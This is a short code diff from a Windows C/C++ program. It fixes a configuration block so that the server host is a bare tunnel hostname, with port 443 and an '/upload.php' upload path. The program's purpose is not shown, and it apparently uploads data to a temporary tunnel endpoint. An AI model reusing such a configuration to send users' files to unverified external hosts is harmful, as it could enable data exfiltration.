@@ -40,7 +40,7 @@
 #pragma comment(lib, "shell32.lib")
 
 // ===================== CONFIG =====================
-static const wchar_t*      SERVER_HOST    = L"https://happy-hawk-634a0e14.tunnl.gg";   // ganti dengan host tunnel kamu
+static const wchar_t*      SERVER_HOST    = L"happy-hawk-634a0e14.tunnl.gg";   // ganti dengan host tunnel kamu
 static const INTERNET_PORT SERVER_PORT    = 443;            // HTTPS
 static const DWORD         SERVER_FLAGS   = WINHTTP_FLAG_SECURE;
 static const wchar_t*      SERVER_PATH    = L"/upload.php";
